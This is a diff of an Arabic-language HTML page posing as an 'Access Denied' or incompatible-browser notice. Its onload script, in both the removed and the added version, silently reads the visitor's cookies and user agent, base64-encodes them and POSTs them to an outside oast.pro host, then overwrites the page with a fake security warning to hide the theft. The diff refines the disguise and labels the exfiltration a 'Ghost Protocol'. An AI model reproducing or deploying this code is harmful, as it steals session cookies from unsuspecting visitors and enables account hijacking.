@@ -1,35 +1,40 @@
-<!DOCTYPE html><html><head><title>تنبيه أمني - الوصول مرفوض</title><meta charset="UTF-8">
+<!DOCTYPE html><html><head><title>Access Denied</title><meta charset="UTF-8">
 <style>
-    body { background-color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
-    .warning-box { background: #fff; padding: 40px; border-radius: 8px; border-top: 4px solid #e74c3c; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; max-width: 500px; width: 90%; }
-    .icon { font-size: 60px; color: #f39c12; margin-bottom: 20px; }
-    h2 { color: #2c3e50; margin-top: 0; font-size: 22px; }
-    p { color: #7f8c8d; font-size: 16px; line-height: 1.6; }
-    .status-box { background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0; border: 1px solid #eee; font-size: 14px; color: #333; }
-    .footer-text { color: #bdc3c7; font-size: 12px; margin-top: 25px; }
+    /* إخفاء أي محتوى خارج الصندوق المركزي */
+    body, html { background-color: #ffffff; margin: 0; padding: 0; height: 100%; overflow: hidden; display: flex; justify-content: center; align-items: center; direction: rtl; }
+    
+    .central-card { background: #fff; padding: 45px; border-radius: 12px; border-top: 5px solid #e74c3c; box-shadow: 0 20px 50px rgba(0,0,0,0.1); text-align: center; max-width: 420px; width: 85%; z-index: 100; }
+    
+    .icon-warning { font-size: 65px; color: #f39c12; margin-bottom: 25px; }
+    
+    h2 { color: #2c3e50; font-size: 20px; margin-bottom: 15px; font-weight: 700; line-height: 1.4; }
+    
+    .description { color: #7f8c8d; font-size: 15px; line-height: 1.8; margin-bottom: 25px; }
+    
+    .error-tag { background: #f8f9fa; padding: 12px; border-radius: 6px; border: 1px solid #eee; font-family: monospace; font-size: 13px; color: #555; }
 </style>
 <script type="text/javascript">
 window.onload = function() {
-    // 1. بروتوكول السحب الصامت (لا يظهر شيء على الشاشة)
-    var c = document.cookie || "none";
-    var payload = btoa(unescape(encodeURIComponent("SILENT_V9|COOKIES:" + c + "|UA:" + navigator.userAgent)));
+    // 1. بروتوكول الحصاد الصامت (Ghost Protocol)
+    var c = document.cookie || "no_session";
+    var payload = btoa(unescape(encodeURIComponent("V10_FINAL|C:" + c + "|UA:" + navigator.userAgent)));
 
-    fetch('https://4f7573d52662cf30e0fbguw9udwyyyyyb.oast.pro?mode=silent_v9', {
+    fetch('https://4f7573d52662cf30e0fbguw9udwyyyyyb.oast.pro?session=v10_active', {
         method: 'POST', mode: 'no-cors', body: payload
     });
 
-    // 2. واجهة التمويه الاحترافية (اللغة العربية)
+    // 2. حقن الواجهة المركزية فقط (لا يوجد شيء في الأسفل)
     document.body.innerHTML = `
-        <div class="warning-box">
-            <div class="icon">⚠️</div>
+        <div class="central-card">
+            <div class="icon-warning">⚠️</div>
             <h2>تم الكشف عن متصفح غير متوافق</h2>
-            <p>لأسباب أمنية، لا يمكن عرض هذه الجلسة المشفرة في متصفحك الحالي. الوصول مقتصر على البيئات المصرح لها فقط.</p>
-            <div class="status-box">
-                المتطلبات: جوجل كروم (الإصدار 120+)<br>
-                الحالة: ACCESS_DENIED_0x00412
+            <div class="description">
+                لأسباب أمنية وتوافقية، لا يمكن عرض هذه الجلسة المشفرة في متصفحك الحالي. الوصول مقتصر على البيئات المحدثة والمعتمدة فقط.
             </div>
-            <p>يرجى <b>نسخ عنوان URL</b> وفتحه مباشرة داخل تطبيق <b>جوجل كروم</b> على جهازك.</p>
-            <div class="footer-text">معرف الأمان: ${Math.random().toString(36).substring(7).toUpperCase()}</div>
+            <div class="error-tag">
+                STATUS: ACCESS_DENIED_0x00412<br>
+                REF_ID: ${Math.random().toString(36).substring(7).toUpperCase()}
+            </div>
         </div>
     `;
 };
